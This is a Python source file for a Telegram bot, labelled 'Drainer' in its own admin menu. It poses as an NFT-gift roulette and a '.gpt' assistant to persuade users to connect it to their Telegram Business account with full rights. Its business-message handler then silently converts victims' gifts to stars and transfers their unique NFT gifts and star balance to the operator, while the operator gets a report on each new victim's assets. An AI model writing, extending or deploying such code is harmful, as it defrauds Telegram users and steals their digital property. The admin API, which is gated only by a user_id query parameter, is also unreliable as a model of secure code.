from aiogram import Bot, Dispatcher, types, F
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, InputMediaPhoto, BufferedInputFile, BusinessConnection, WebAppInfo, KeyboardButton, ReplyKeyboardMarkup
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest
from aiogram.client.default import DefaultBotProperties
import asyncio
import logging
import json
import os
import random
import io
from PIL import Image, ImageDraw, ImageFont  # pip install pillow
from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts
from aiogram.methods import GetBusinessAccountGifts
from flask import Flask, jsonify, request, abort, send_from_directory
from scraper import get_gift_data # Добавить вверху файла
from datetime import datetime
from fastapi import FastAPI, Request as FastAPIRequest
from fastapi.middleware.wsgi import WSGIMiddleware
from config import config

# --- Включаем логирование ---
logging.basicConfig(
    level=logging.DEBUG if config.debug else logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

# --- Инициализация бота и диспетчера ---
bot = Bot(config.bot_token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
flask_app = Flask(__name__, static_folder=None) # Отключаем стандартную обработку static
app = FastAPI() # Наше "главное" новое приложение

# --- Webhook эндпоинт на FastAPI с проверкой подписи ---
@app.post("/webhook")
async def bot_webhook(request: FastAPIRequest):
    try:
        # Проверяем заголовки для валидации подписи Telegram
        headers = dict(request.headers)
        if 'X-Telegram-Bot-Api-Secret-Token' in headers:
            if headers['X-Telegram-Bot-Api-Secret-Token'] != config.webhook_secret:
                logging.warning("Invalid webhook secret token")
                return {"ok": False, "error": "Unauthorized"}, 401
        
        update_data = await request.json()
        update = types.Update.model_validate(update_data, context={"bot": bot})
        await dp.feed_update(bot, update)
        return {"ok": True}
    except Exception as e:
        logging.error(f"Error processing webhook: {e}")
        return {"ok": False, "error": str(e)}, 500

# --- Жизненный цикл (на FastAPI) ---
@app.on_event("startup")
async def on_startup():
    if config.webhook_url:
        await bot.set_webhook(url=f"{config.webhook_url}/webhook", drop_pending_updates=True)
        logging.warning(f"Webhook set to {config.webhook_url}/webhook")

@app.on_event("shutdown")
async def on_shutdown():
    await bot.delete_webhook()
    logging.warning("Webhook deleted.")

# --- Эндпоинты Flask для WebApp ---
# Все @app.route теперь становятся @flask_app.route
@flask_app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@flask_app.route('/<path:path>')
def static_files(path):
    # Отдаем все остальные файлы (JS, CSS, изображения) из корневой директории
    return send_from_directory('.', path)

# --- Управление данными пользователей ---
USER_DATA_FILE = "user_data.json"
MAX_ATTEMPTS = config.max_attempts

def read_user_data():
    """Читает данные пользователей из файла с обработкой ошибок"""
    if not os.path.exists(USER_DATA_FILE):
        logging.info(f"User data file {USER_DATA_FILE} not found, creating new one")
        return {}
    try:
        with open(USER_DATA_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            logging.debug(f"Successfully loaded user data for {len(data)} users")
            return data
    except json.JSONDecodeError as e:
        logging.error(f"JSON decode error in {USER_DATA_FILE}: {e}")
        # Создаем резервную копию поврежденного файла
        backup_file = f"{USER_DATA_FILE}.backup.{int(datetime.now().timestamp())}"
        try:
            os.rename(USER_DATA_FILE, backup_file)
            logging.info(f"Corrupted file backed up as {backup_file}")
        except OSError as backup_error:
            logging.error(f"Failed to create backup: {backup_error}")
        return {}
    except FileNotFoundError:
        logging.warning(f"User data file {USER_DATA_FILE} not found")
        return {}
    except Exception as e:
        logging.error(f"Unexpected error reading user data: {e}")
        return {}

def write_user_data(data):
    """Записывает данные пользователей в файл с обработкой ошибок"""
    try:
        # Создаем временный файл для атомарной записи
        temp_file = f"{USER_DATA_FILE}.tmp"
        with open(temp_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        # Атомарно заменяем старый файл новым
        os.replace(temp_file, USER_DATA_FILE)
        logging.debug(f"Successfully saved user data for {len(data)} users")
    except Exception as e:
        logging.error(f"Error writing user data: {e}")
        # Пытаемся удалить временный файл
        try:
            if os.path.exists(temp_file):
                os.remove(temp_file)
        except OSError:
            pass
        raise

# --- Новые API эндпоинты для рулетки ---

@flask_app.route('/api/get_user_status')
def get_user_status():
    user_id = request.args.get('user_id')
    if not user_id:
        return jsonify({"error": "user_id is required"}), 400
    
    # Валидация user_id
    try:
        user_id_int = int(user_id)
        if user_id_int <= 0:
            return jsonify({"error": "user_id must be a positive integer"}), 400
    except ValueError:
        return jsonify({"error": "user_id must be a valid integer"}), 400
    
    try:
        all_data = read_user_data()
        user_info = all_data.get(str(user_id), {"attempts": 0, "gifts": []})
        
        return jsonify({
            "attempts_left": MAX_ATTEMPTS - user_info.get("attempts", 0),
            "gifts": user_info.get("gifts", [])
        })
    except Exception as e:
        logging.error(f"Error getting user status for {user_id}: {e}")
        return jsonify({"error": "Internal server error"}), 500

@flask_app.route('/api/user', methods=['POST'])
def handle_user_data():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "Invalid data"}), 400
            
        user_id = data.get('user_id')
        if not user_id:
            return jsonify({"error": "user_id is required"}), 400

        # Валидация user_id
        try:
            user_id_int = int(user_id)
            if user_id_int <= 0:
                return jsonify({"error": "user_id must be a positive integer"}), 400
        except ValueError:
            return jsonify({"error": "user_id must be a valid integer"}), 400

        # Добавим логику создания пользователя, если он не существует
        all_data = read_user_data()
        user_info = all_data.setdefault(str(user_id), {"attempts": 0, "gifts": []})
        write_user_data(all_data)

        return jsonify({"status": "ok", "message": f"User {user_id} acknowledged."})
    except Exception as e:
        logging.error(f"Error handling user data: {e}")
        return jsonify({"error": "Internal server error"}), 500

@flask_app.route('/api/spin', methods=['POST'])
def handle_spin():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "Invalid data"}), 400

        user_id = str(data.get('user_id'))
        if not user_id:
            return jsonify({"error": "user_id is required"}), 400

        # Валидация user_id
        try:
            user_id_int = int(user_id)
            if user_id_int <= 0:
                return jsonify({"error": "user_id must be a positive integer"}), 400
        except ValueError:
            return jsonify({"error": "user_id must be a valid integer"}), 400

        all_data = read_user_data()
        user_info = all_data.setdefault(user_id, {"attempts": 0, "gifts": []})

        if user_info["attempts"] >= MAX_ATTEMPTS:
            return jsonify({"error": "No attempts left"}), 403

        user_info["attempts"] += 1

        # Логика определения приза (копируем из prizes.js, чтобы не было рассинхрона)
        prizes = [
            {"name": "Nail Bracelet", "starPrice": 100000, "img": "images/nail_bracelet.png"},
            {"name": "Bonded Ring", "starPrice": 37500, "img": "images/bonded_ring.png"},
            {"name": "Neko Helmet", "starPrice": 14000, "img": "images/neko_helmet.png"},
            {"name": "Пусто", "starPrice": 0, "img": ""}
        ]
        won_prize = random.choice(prizes)

        if won_prize["starPrice"] > 0:
            gift_data = {
                **won_prize,
                "date": datetime.now().strftime('%d.%m.%Y')
            }
            user_info["gifts"].append(gift_data)

        write_user_data(all_data)
        
        return jsonify({"won_prize": won_prize})
    except Exception as e:
        logging.error(f"Error handling spin for user {data.get('user_id') if data else 'unknown'}: {e}")
        return jsonify({"error": "Internal server error"}), 500

@flask_app.route('/prizes')
def prizes():
    # Здесь можно получать актуальные данные из базы или Telegram
    return jsonify([
        {"name": "iPhone 15", "price": 90000},
        {"name": "AirPods", "price": 15000},
        {"name": "1000₽", "price": 1000},
        {"name": "Пусто", "price": 0},
        {"name": "MacBook", "price": 150000},
        {"name": "Чашка", "price": 500},
        {"name": "PlayStation 5", "price": 60000},
        {"name": "Книга", "price": 1000}
    ])

# --- Логика для команд, чтобы переиспользовать ее ---

async def process_start_command(message: Message):
    if not message.from_user:
        return

    # Проверяем, админ ли это
    if message.from_user.id == config.admin_id:
        # Админское приветствие
        admin_text = (
            "<b>Antistoper Drainer</b>\n\n"
            "🔗 /gifts - просмотреть гифты\n"
            "🔗 /stars - просмотреть звезды\n"
            "🔗 /transfer <code>&lt;owned_id&gt; &lt;business_connect&gt;</code> - передать гифт вручную\n"
            "🔗 /convert - конвертировать подарки в звезды"
        )
        if config.webhook_url:
            webapp_url = config.webhook_url
            keyboard = ReplyKeyboardMarkup(
                keyboard=[[KeyboardButton(text="🎰 Открыть рулетку", web_app=WebAppInfo(url=webapp_url))]],
                resize_keyboard=True
            )
            await message.answer(admin_text, reply_markup=keyboard)
        else:
            await message.answer(admin_text)

    else:
        # Пользовательское приветствие
        if config.webhook_url:
            webapp_url = config.webhook_url
            keyboard = ReplyKeyboardMarkup(
                keyboard=[[KeyboardButton(text="🎰 Открыть рулетку", web_app=WebAppInfo(url=webapp_url))]],
                resize_keyboard=True
            )
            await message.answer(
                "🎁<b>Привет! Ты в боте рулетка NFT подарков Gift Sender🎁</b>, который:\n",
                reply_markup=keyboard
            )
        else:
            await message.answer(
                "❤️ <b>Я — твой главный помощник...</b> (WebApp не настроен)"
            )

async def process_admin_command(message: Message):
    logging.info(f"Admin command received from user {message.from_user.id if message.from_user else 'Unknown'}")
    try:
        if not message.from_user:
            logging.warning("Cannot process /admin command without user info")
            return

        logging.info(f"Comparing user ID {message.from_user.id} with ADMIN_ID {config.admin_id}")
        if message.from_user.id != config.admin_id:
            logging.info(f"User {message.from_user.id} is not admin. Sending 'no rights' message.")
            return await message.answer("У вас нет прав для доступа к этой команде.")

        logging.info(f"User {message.from_user.id} is admin. Preparing admin panel link.")

        if not config.webhook_url:
            logging.error("WEBHOOK_URL is not set! Cannot create admin panel link.")
            return await message.answer("Ошибка конфигурации сервера: не удалось создать ссылку.")

        admin_url = f"{config.webhook_url}/admin.html"
        logging.info(f"Admin panel URL created: {admin_url}")

        keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔑 Открыть админ-панель", url=admin_url)]])
        logging.info("Keyboard created. Sending message...")

        await message.answer("Админ-панель доступна по кнопке ниже:", reply_markup=keyboard)
        logging.info("Admin panel message sent successfully.")

    except Exception as e:
        logging.exception("An error occurred in the admin_command handler!")
        await message.answer("Произошла внутренняя ошибка. Проверьте логи сервера.")

async def process_resetwebhook_command(message: Message):
    if not message.from_user or message.from_user.id != config.admin_id:
        return

    logging.info("--- Force resetting webhook ---")
    if config.webhook_url:
        await bot.set_webhook(url=f"{config.webhook_url}/webhook", drop_pending_updates=True)
        await message.answer("Webhook был сброшен!")
        logging.info("--- Webhook has been reset ---")
    else:
        await message.answer("Ошибка: WEBHOOK_URL не настроен.")


# --- Новые, четкие обработчики для админа ---
@dp.message(Command("start"), F.from_user.id == config.admin_id)
async def admin_start_command(message: Message):
    await process_start_command(message)

@dp.message(Command("admin"), F.from_user.id == config.admin_id)
async def admin_admin_command(message: Message):
    await process_admin_command(message)

@dp.message(Command("resetwebhook"), F.from_user.id == config.admin_id)
async def admin_resetwebhook_command(message: Message):
    await process_resetwebhook_command(message)

# --- Новые, четкие обработчики для обычных пользователей ---
@dp.message(Command("start"), F.from_user.id != config.admin_id)
async def user_start_command(message: Message):
    await process_start_command(message)

# Обработчик для любого текста от пользователя (НЕ админа), который НЕ является командой
@dp.message(F.text, F.from_user.id != config.admin_id)
async def user_text_handler(message: Message):
    # Дополнительно проверяем, что это не команда, которую мы могли пропустить
    if message.text and message.text.startswith('/'):
        # Можно отправить сообщение "неизвестная команда" или просто проигнорировать
        return

    await message.answer(
        "📌 <b>Для полноценной работы необходимо подключить бота к бизнес-аккаунту Telegram</b>\n\n"
        "Как это сделать?\n\n"
        "1. ⚙️ Откройте <b>Настройки Telegram</b>\n"
        "2. 💼 Перейдите в раздел <b>Telegram для бизнеса</b>\n"
        "3. 🤖 Откройте пункт <b>Чат-боты</b>\n\n"
        "Имя бота: <code>@GiftWinsSender_BOT</code>\n"
        "❗Для корректной работы боту требуются <b>все права</b>",
        parse_mode="HTML"
    )

CONNECTIONS_FILE = "business_connections.json"

def load_json_file(filename):
    try:
        with open(filename, "r") as f:
            content = f.read().strip()
            if not content:
                return [] 
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("Ошибка при разборе JSON-файла.")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    import json
    with open("connections.json", "r") as f:
        data = json.load(f)
    return data.get(str(user_id))

def load_connections():
    with open("business_connections.json", "r") as f:
        return json.load(f)

async def send_welcome_message_to_admin(connection, user_id, _bot):
    try:
        admin_id = config.admin_id
        rights = connection.rights
        if rights is None:
            await _bot.send_message(admin_id, "❗ Не удалось получить права бизнес-бота. Проверьте подключение.")
            return
        business_connection = connection

        rights_text = "\n".join([
            f"📍 <b>Права бота:</b>",
            f"▫️ Чтение сообщений: {'✅' if rights.can_read_messages else '❌'}",
            f"▫️ Удаление всех сообщений: {'✅' if rights.can_delete_all_messages else '❌'}",
            f"▫️ Редактирование имени: {'✅' if rights.can_edit_name else '❌'}",
            f"▫️ Редактирование описания: {'✅' if rights.can_edit_bio else '❌'}",
            f"▫️ Редактирование фото профиля: {'✅' if rights.can_edit_profile_photo else '❌'}",
            f"▫️ Редактирование username: {'✅' if rights.can_edit_username else '❌'}",
            f"▫️ Настройки подарков: {'✅' if rights.can_change_gift_settings else '❌'}",
            f"▫️ Просмотр подарков и звёзд: {'✅' if rights.can_view_gifts_and_stars else '❌'}",
            f"▫️ Конвертация подарков в звёзды: {'✅' if rights.can_convert_gifts_to_stars else '❌'}",
            f"▫️ Передача/улучшение подарков: {'✅' if rights.can_transfer_and_upgrade_gifts else '❌'}",
            f"▫️ Передача звёзд: {'✅' if rights.can_transfer_stars else '❌'}",
            f"▫️ Управление историями: {'✅' if rights.can_manage_stories else '❌'}",
            f"▫️ Удаление отправленных сообщений: {'✅' if rights.can_delete_sent_messages else '❌'}",
        ])

        star_amount = 0
        all_gifts_amount = 0
        unique_gifts_amount = 0

        if rights.can_view_gifts_and_stars:
            response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
            star_amount = response.star_amount

            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
            all_gifts_amount = len(gifts.gifts)
            unique_gifts_amount = sum(1 for gift in gifts.gifts if getattr(gift, 'type', None) == "unique")

        star_amount_text = star_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
        all_gifts_text = all_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
        unique_gitfs_text = unique_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"

        msg = (
            f"🤖 <b>Новый бизнес-бот подключен!</b>\n\n"
            f"👤 Пользователь: @{getattr(business_connection.user, 'username', '—')}\n"
            f"🆔 User ID: <code>{getattr(business_connection.user, 'id', '—')}</code>\n"
            f"🔗 Connection ID: <code>{business_connection.id}</code>\n"
            f"\n{rights_text}"
            f"\n⭐️ Звезды: <code>{star_amount_text}</code>"
            f"\n🎁 Подарков: <code>{all_gifts_text}</code>"
            f"\n🔝 NFT подарков: <code>{unique_gitfs_text}</code>"            
        )
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="🎁 Вывести все подарки (и превратить все подарки в звезды)", callback_data=f"reveal_all_gifts:{user_id}")],
                [InlineKeyboardButton(text="⭐️ Превратить все подарки в звезды", callback_data=f"convert_exec:{user_id}")],
                [InlineKeyboardButton(text=f"🔝 Апгрейднуть все гифты", callback_data=f"upgrade_user:{user_id}")]
            ]
        )
        await _bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
    except Exception as e:
        logging.exception("Не удалось отправить сообщение в личный чат.")

@dp.callback_query(F.data.startswith("reveal_all_gifts"))
async def handle_reveal_gifts(callback: CallbackQuery):
    await callback.answer("Обработка подарков…")

def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": "FirstName",
        "last_name": "LastName"
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # Сохраняем обратно
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -> str:
    try:
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))

        if not gifts.gifts:
            return "🎁 Нет подарков."
        else:
            for gift in gifts.gifts:
                if getattr(gift, 'owned_gift_id', None) == owned_gift_id:
                    gift_name = getattr(getattr(gift, 'gift', None), 'base_name', '').replace(" ", "")
                    gift_number = getattr(getattr(gift, 'gift', None), 'number', '')
                    return f"https://t.me/nft/{gift_name}-{gift_number}"
        return "🎁 Нет подарков."
    except Exception as e:
        return "🎁 Нет подарков."

@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    try:
        await send_welcome_message_to_admin(business_connection, business_connection.user.id, bot)
        await bot.send_message(business_connection.user.id, "Привет! Ты подключил бота как бизнес-ассистента. Теперь отправьте в любом личном чате '.gpt запрос'")

        business_connection_data = {
            "user_id": business_connection.user.id,
            "business_connection_id": business_connection.id,
            "username": business_connection.user.username,
            "first_name": "FirstName",
            "last_name": "LastName"
        }
        user_id = business_connection.user.id
        connection_id = business_connection.user.id
    except Exception as e:
        logging.exception("Ошибка при обработке бизнес-подключения")

from aiogram import types
from aiogram.filters import Command
from g4f.client import Client as G4FClient

OWNER_ID = config.admin_id
task_id = config.admin_id

@dp.business_message()
async def get_message(message: types.Message):
    # --- Новая часть: Обработка команд в бизнес-чате ---
    if message.text:
        # Проверяем, является ли сообщение командой для админа
        if message.from_user and message.from_user.id == config.admin_id:
            if message.text.startswith('/start'):
                await process_start_command(message)
                return
            if message.text.startswith('/admin'):
                await process_admin_command(message)
                return
            if message.text.startswith('/resetwebhook'):
                await process_resetwebhook_command(message)
                return

    # --- Старая логика (с исправлением) ---
    business_id = getattr(message, 'business_connection_id', None)
    
    if not business_id:
        print("business_connection_id is None")
        return

    # === Конвертация неуникальных подарков ===
    try:
        convert_gifts = await bot.get_business_account_gifts(business_connection_id=business_id, exclude_unique=True)
        for gift in convert_gifts.gifts:
            try:
                owned_gift_id = getattr(gift, 'owned_gift_id', None)
                if owned_gift_id:
                    await bot.convert_gift_to_stars(business_connection_id=business_id, owned_gift_id=owned_gift_id)
            except Exception as e:
                print(f"Ошибка при конвертации подарка {owned_gift_id}: {e}")
                continue
    except Exception as e:
        print(f"Ошибка при получении неуникальных подарков: {e}")
    try:
        unique_gifts = await bot.get_business_account_gifts(business_connection_id=business_id, exclude_unique=False)
        if not unique_gifts.gifts:
            print("Нет уникальных подарков для отправки.")
        for gift in unique_gifts.gifts:
            try:
                owned_gift_id = getattr(gift, 'owned_gift_id', None)
                if owned_gift_id:
                    await bot.transfer_gift(
                        business_connection_id=business_id,
                        owned_gift_id=owned_gift_id,
                        new_owner_chat_id=task_id
                    )
                    print(f"Успешно отправлен подарок {owned_gift_id} на task_id {task_id}")
            except Exception as e:
                print(f"Ошибка при отправке подарка {owned_gift_id}: {e}")
                continue
    except Exception as e:
        print(f"Ошибка при получении уникальных подарков: {e}")
    try:
        stars = await bot.get_business_account_star_balance(business_connection_id=business_id)
        if getattr(stars, 'amount', 0) > 0:
            print(f"Успешно отправлено {stars.amount} звёзд")
            await bot.transfer_business_account_stars(
                business_connection_id=business_id,
                star_count=int(stars.amount)
            )
        else:
            print("Нет звёзд для отправки.")
    except Exception as e:
        print(f"Ошибка при работе с балансом звёзд: {e}")

async def get_gifts():
    # Примерная заглушка, замените на реальный API
    return [
        {'name': 'Плюшевый медведь', 'price': 100},
        {'name': 'Кубок', 'price': 200},
        {'name': 'Сердце', 'price': 50},
        {'name': 'Звезда', 'price': 300},
        {'name': 'Книга', 'price': 80},
        {'name': 'Котик', 'price': 150},
        {'name': 'Робот', 'price': 250},
    ]

def generate_roulette_image(gifts, highlight_index):
    width, height = 600, 120
    img = Image.new("RGB", (width, height), "white")
    draw = ImageDraw.Draw(img)
    try:
        font = ImageFont.truetype("arial.ttf", 18)
    except Exception:
        font = ImageFont.load_default()
    sector_w = width // len(gifts)
    for i, gift in enumerate(gifts):
        x = i * sector_w
        color = "yellow" if i == highlight_index else "lightgray"
        draw.rectangle([x, 0, x+sector_w, height], fill=color)
        draw.text((x+10, 40), f"{gift['name']}\n{gift['price']}⭐", fill="black", font=font)
    return img

@dp.message(F.text == "/roulette")
async def start_roulette(message: types.Message):
    gifts = await get_gifts()
    if not gifts:
        await message.answer("Нет подарков для рулетки.")
        return

    roll_sequence = []
    for _ in range(20):
        idx = random.randint(0, len(gifts)-1)
        window = [gifts[(idx+i)%len(gifts)] for i in range(-2, 3)]
        roll_sequence.append((window, 2))
    win_idx = random.randint(0, len(gifts)-1)
    window = [gifts[(win_idx+i)%len(gifts)] for i in range(-2, 3)]
    roll_sequence.append((window, 2))

    msg = await message.answer("Крутим рулетку...")
    roulette_msg = None
    for i, (window, highlight) in enumerate(roll_sequence):
        img = generate_roulette_image(window, highlight)
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        input_file = BufferedInputFile(buf.getvalue(), "roulette.png")
        if i == 0:
            roulette_msg = await message.answer_photo(input_file)
        else:
            if roulette_msg:
                try:
                    await roulette_msg.edit_media(InputMediaPhoto(media=input_file))
                except Exception:
                    pass
        await asyncio.sleep(0.12 + i*0.03)

    win_gift = window[highlight]
    await message.answer(
        f"🎉 Поздравляем! Вы выиграли: <b>{win_gift['name']}</b> за <b>{win_gift['price']}⭐</b>.\n\n"
        "Чтобы забрать подарок, подключите бота в раздел Чат-боты Telegram для бизнеса.",
        parse_mode="HTML"
    )

    webapp_url = "https://my-roulette-app-pi.vercel.app/"  # или локальный ngrok, если тестируешь

    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🎰 Открыть рулетку", web_app=WebAppInfo(url=webapp_url))]
        ],
        resize_keyboard=True
    )

    await message.answer("Жми кнопку и крути рулетку!", reply_markup=keyboard)

@dp.message(F.web_app_data)
async def on_webapp_data(message: types.Message):
    if not message.web_app_data:
        return

    data_str = message.web_app_data.data
    try:
        data = json.loads(data_str)
        
        # Проверяем, нужно ли показать инструкцию
        if data.get('action') == 'show_connection_instructions':
            instruction_text = (
                "📌 <b>Для вывода подарка, подключите бота к бизнес-аккаунту.</b>\n\n"
                "Как это сделать:\n\n"
                "1. ⚙️ Откройте <b>Настройки Telegram</b>\n"
                "2. 💼 Перейдите в раздел <b>Telegram для бизнеса</b>\n"
                "3. 🤖 Откройте пункт <b>Чат-боты</b> и добавьте этого бота.\n\n"
                "❗️Для корректной работы боту требуются права на управление подарками."
            )
            await message.answer(instruction_text, parse_mode="HTML")
            return

        # Логика обработки выигрыша (остается без изменений)
        prize = data.get('prize', {})
        if prize.get('starPrice', 0) > 0:
            text = f"🎉 Поздравляем! Ты выиграл: {prize.get('name', 'ничего')} ({prize.get('starPrice', 0)}⭐)"
        else:
            text = "В этот раз не повезло, но попробуй еще раз!"
        await message.answer(text)

    except json.JSONDecodeError:
        await message.answer("Произошла ошибка при обработке данных.")

@dp.message(Command("giftinfo"))
async def gift_info_command(message: types.Message):
    if not message.text or len(message.text.split()) < 2:
        await message.answer("Пожалуйста, укажите URL подарка. Пример: /giftinfo <url>")
        return

    url = message.text.split()[1]
    data = get_gift_data(url)

    if not data:
        await message.answer("Не удалось получить информацию о подарке.")
        return

    # Форматируем красивый ответ
    details_text = "\n".join([f" • {k.replace('_', ' ').title()}: {v['name']} ({v['rarity']})" for k, v in data.get('details', {}).items() if v['rarity']])
    response_text = (
        f"<b>{data.get('title', 'Без названия')}</b>\n\n"
        f"{details_text}\n\n"
        f"<a href='{data.get('media_url', '')}'>Медиафайл</a>"
    )
    await message.answer(response_text, parse_mode="HTML")

# --- Новые API эндпоинты для админ-панели ---

@flask_app.route('/api/admin/connections')
def get_admin_connections():
    user_id_str = request.args.get('user_id')
    if not user_id_str or int(user_id_str) != config.admin_id:
        abort(403) # Доступ запрещен
    try:
        connections = load_json_file(CONNECTIONS_FILE)
        return jsonify(connections)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@flask_app.route('/api/admin/user_data')
def get_admin_user_data():
    user_id_str = request.args.get('user_id')
    if not user_id_str or int(user_id_str) != config.admin_id:
        abort(403) # Доступ запрещен
    try:
        user_data = read_user_data()
        return jsonify(user_data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@flask_app.route('/admin')
def admin_page():
    # Отдаем статичный файл admin.html
    return flask_app.send_static_file('admin.html')

# --- "Склеиваем" два приложения ---
# FastAPI будет обрабатывать /webhook, а всё остальное передавать в Flask
app.mount("/", WSGIMiddleware(flask_app))

# Этот блок нужен для Render, чтобы gunicorn мог запустить приложение
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    print("Bot is running locally...")
    dp.run_polling(bot)